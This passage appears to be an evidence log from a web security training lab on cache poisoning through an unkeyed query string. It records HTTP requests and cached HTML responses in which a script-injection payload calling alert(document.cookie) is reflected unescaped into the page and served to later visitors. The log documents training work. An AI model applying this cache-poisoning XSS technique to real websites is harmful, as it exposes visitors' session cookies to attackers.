                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr822t1l-64` — `artifacts/_/ev-mr822t1l-64/`

Request:

```http
GET /?to=%27%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&pad=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
age: 5
cache-control: max-age=35
content-length: 12471
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?to='"><script>alert(document.cookie)</script>&pad=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr822xay-65` — `artifacts/_/ev-mr822xay-65/`

Request:

```http
GET / HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
age: 11
cache-control: max-age=35
content-length: 12471
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?to='"><script>alert(document.cookie)</script>&pad=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
